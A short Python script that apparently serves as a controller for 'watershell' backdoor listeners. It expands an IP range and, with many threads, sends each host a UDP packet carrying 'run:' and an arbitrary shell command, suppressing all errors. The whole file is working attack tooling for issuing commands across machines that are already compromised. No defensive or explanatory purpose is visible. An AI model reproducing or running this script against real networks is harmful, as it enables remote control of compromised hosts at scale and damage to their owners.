import argparse
import socket
from concurrent.futures import ThreadPoolExecutor, as_completed

def parse_ip_range(ip_range):
    parts = ip_range.split('.')
    if len(parts) != 4:
        raise SystemExit("Invalid IP range format")

    def expand(part):
        vals = []
        for section in part.split(','):
            if '-' in section:
                s, e = map(int, section.split('-'))
                vals.extend(range(s, e + 1))
            else:
                vals.append(int(section))
        return vals

    expanded = [expand(p) for p in parts]
    return [
        f"{a}.{b}.{c}.{d}"
        for a in expanded[0]
        for b in expanded[1]
        for c in expanded[2]
        for d in expanded[3]
    ]

def send_cmd(ip, port, payload):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.sendto(payload, (ip, port))
        sock.close()
    except Exception:
        pass  # fire-and-forget, no retries

def main():
    parser = argparse.ArgumentParser(description="Threaded command shout to watershell listeners")
    parser.add_argument("command", help="Command to run (without run: prefix)")
    parser.add_argument("-p", "--port", type=int, required=True, help="Watershell UDP port")
    parser.add_argument("-t", "--targets", required=True, help="IP range (e.g. 10.0.0.1-254)")
    parser.add_argument("-w", "--workers", type=int, default=64, help="Thread count (default: 64)")

    args = parser.parse_args()

    ips = parse_ip_range(args.targets)
    payload = f"run:{args.command}".encode()

    with ThreadPoolExecutor(max_workers=args.workers) as pool:
        futures = [
            pool.submit(send_cmd, ip, args.port, payload)
            for ip in ips
        ]
        for _ in as_completed(futures):
            pass  # drain futures

if __name__ == "__main__":
    main()